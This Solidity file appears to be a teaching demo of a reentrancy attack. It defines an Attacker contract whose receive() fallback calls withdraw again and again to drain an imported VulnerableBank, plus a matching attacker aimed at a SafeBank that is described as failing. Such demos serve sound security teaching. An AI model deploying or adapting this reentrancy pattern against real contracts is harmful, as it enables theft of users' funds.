// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import {VulnerableBank} from "./VulnerableBank.sol";
import {SafeBank} from "./SafeBank.sol";

/// @title A simulator for attacker contract.
/// @author Mikiyas.
/// @notice this is just simulation for attacker contract.
contract Attacker {
    VulnerableBank public bank;

    constructor(VulnerableBank _bank) {
        bank = _bank;
    }

    receive() external payable {
        uint256 bal = address(bank).balance;
        if (bal >= 10_000 ether) {
            bank.withdraw(10_000 ether);
        }
    }

    function deposit() external payable {}

    function depositToVictimContractAndAttack() external {
        bank.deposit{value: 10_000 ether}();
        bank.withdraw(10_000 ether);
    }

    function getTotalBalance() external view returns (uint256 balanceOfContract) {
        balanceOfContract = address(this).balance;
    }
}

/// @title A simulator for attacker contract which doesn't work.
/// @author Mikiyas.
/// @notice this is just simulation for attacker contract which fails.
contract SafeBankAttacker {
    SafeBank public sbank;

    constructor(SafeBank _bank) {
        sbank = _bank;
    }

    receive() external payable {
        uint256 bal = address(sbank).balance;
        if (bal >= 10_000 ether) {
            sbank.withdraw(10_000 ether);
        }
    }

    function deposit() external payable {}

    function depositToVictimContractAndAttack() external {
        sbank.deposit{value: 10_000 ether}();
        sbank.withdraw(10_000 ether);
    }

    function getTotalBalance() external view returns (uint256 balanceOfContract) {
        balanceOfContract = address(this).balance;
    }
}
